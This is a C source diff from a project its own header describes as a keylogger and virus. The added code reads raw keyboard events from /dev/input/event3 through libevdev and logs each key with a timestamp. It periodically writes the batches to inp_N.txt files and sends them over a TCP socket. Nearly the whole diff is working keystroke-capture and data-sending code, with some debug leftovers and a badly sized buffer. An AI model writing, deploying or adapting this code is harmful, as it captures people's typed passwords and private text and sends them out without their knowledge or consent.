@@ -3,6 +3,7 @@ Main function to run to create keylogger and virus
 */
 
 #include <arpa/inet.h>
+#include <libevdev/libevdev.h>
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -36,14 +37,117 @@ int main(void) {
     error_and_exit("Couldn't open socket as file stream.");
   }
 
-  // if (socket_file == NULL) {
-  //   printf("socket file is null\n");
-  // }
+  key_package pack;
+  pack.keys_arr_size = 0;
+  pack.keys = malloc(sizeof(char));
+  key_package* package = &pack;
+
+  log_device(package);
+  //  if (socket_file == NULL) {
+  //    printf("socket file is null\n");
+  //  }
 
   // Send data until either the client or the server closes its stream.
   int socket_file_status = 0;
+  //   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
+  int timer_counter = 20000000;  // 20000000
+
+  // open a device, as libevdev expects a file descriptor. You should have root
+  // permissions
+  struct libevdev* keyboard_dev;
+  int rc;
+
+  // get keyboard inputs event file
+  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
+  if (keyboard_fd < 0) {
+    fprintf(stderr, "Error opening event3 file: %d %s\n", errno,
+            strerror(errno));
+    exit(0);
+  }
+  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
+  if (rc < 0) {
+    fprintf(stderr, "Error with setting rc: %d %s\n", -rc, strerror(-rc));
+    exit(0);
+  }
+  int file_name_counter = 0;
+  int counter = 0;
   while (socket_file_status != -1) {
-    socket_file_status = send_data(socket_file);
+    ++counter;
+    struct input_event ev;
+
+    // other options: LIBEVDEV_READ_FLAG_NORMAL
+    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
+    if (rc < 0) {
+      // note that this section runs when no event is occurring, NOT necessarily
+      // when there is an error printf("value of rc: %d\n", rc);
+      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
+    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
+      // handle event here
+
+      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
+      // we only care about EV_KEY, represented by ev.type == 1
+      if (ev.type == 1) {
+        if (ev.value == 1 || ev.value == 2) {
+          // get current time
+          time_t rawtime;
+          struct tm* timeinfo;
+          time(&rawtime);
+          timeinfo = localtime(&rawtime);
+
+          // make key struct, add to key package. do the file writing in another
+          // file
+          key_info pressed_key = {
+              .key = libevdev_event_code_get_name(ev.type, ev.code),
+              .timestamp = asctime(timeinfo)};
+
+          // append to key_package->keys
+          package->keys[package->keys_arr_size] = pressed_key;
+          package->keys_arr_size++;
+
+          // printf("New key_package array size: %ld\n",
+          // key_package->keys_arr_size);
+        }
+      }
+    } else {
+      printf("Unsure of what is going on here..\n");
+    }
+
+    // If the counter is equal to the timer, send data
+    if (counter == timer_counter) {
+      counter = 0;
+      // // read and write and whee
+      // // convert int to str
+      print_logged_keys(*package);
+      char str[20];
+      sprintf(str, "inp_%d", file_name_counter);
+      char* file_name = strcat(str, ".txt");
+
+      FILE* package_log = fopen(file_name, "w");
+      if (package_log == NULL) {
+        error_and_exit("Couldn't open package log");
+      }
+      keys_to_file(package_log, *package);
+
+      // // call send data functoin on package_log
+      if (package->keys_arr_size != 0) {
+        reset_structs(package);
+      }
+      ++file_name_counter;
+
+      puts("here 1");
+      puts(file_name);
+      fclose(package_log);
+      if (send_data(socket_file, file_name) != 0) {
+        error_and_exit("what is the point");
+      }
+      puts("here 2");
+    }
+
+    // EXIT with F12
+    if (ev.code == 107) {
+      // if (log_indicator == 0) {
+      error_and_exit("Exiting");
+    }
   }
 
   // If we didn't hit the end of file for either stdin or the response from the
@@ -51,8 +155,9 @@ int main(void) {
   if (!feof(stdin) && !feof(socket_file)) {
     error_and_exit("Error reading or writing line:");
   }
-
-  // Clean up and exit.
+  // Clean up
+  libevdev_free(keyboard_dev);
+  close(keyboard_fd);
   close_tcp_socket(socket_descriptor);
   return 0;
 }
